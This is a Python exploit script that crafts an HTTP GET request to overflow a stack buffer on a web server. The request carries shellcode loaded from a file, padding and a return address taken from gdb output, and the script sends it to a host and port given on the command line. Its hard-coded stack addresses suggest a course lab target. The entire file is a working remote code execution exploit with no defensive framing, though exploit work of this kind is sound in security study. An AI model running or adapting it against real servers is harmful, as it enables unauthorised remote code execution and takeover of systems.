#!/usr/bin/env python3

import sys
import socket
import traceback
import urllib.parse
import struct

# ðŸ“Œ Update these addresses based on your gdb results
STACK_SAVED_EBP = 0x7fffffffcee0  # Found using `info frame`
STACK_OLD_RETADDR = 0x555555557b40  # Found using `info frame`
BUFFER_OFFSET = 2088  # Offset to overwrite return address
SHELLCODE_ADDR = 0x7fffffffc6c0  # Found using `print &pn`

def repeat_to_length(byte_string, length):
    """Repeats a byte string to the desired length."""
    return (byte_string * ((length // len(byte_string)) + 1))[:length]

def build_exploit(shellcode):
    """Constructs the HTTP request payload."""
    fill_len = BUFFER_OFFSET - len(shellcode) - 1 + 4  # Ensure correct buffer size

    req = (
        b"GET /" + shellcode +  # Inject shellcode at start
        repeat_to_length(b"A", fill_len) +  # Fill buffer until return address
        struct.pack("<Q", SHELLCODE_ADDR) +  # Overwrite return address
        b" HTTP/1.0\r\n\r\n"  # Correctly formatted HTTP request
    )
    return req

def send_req(host, port, req):
    """Sends the exploit payload to the server."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"Connecting to {host}:{port}...")
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    resp = b""  # Ensure bytes are used
    rbuf = sock.recv(1024)
    while rbuf:
        resp += rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp  # Returning bytes to avoid errors

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " <host> <port>")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")  # Read in binary mode
    shellcode = shellfile.read()
    
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except Exception as e:
    print("Exception:")
    print(traceback.format_exc())
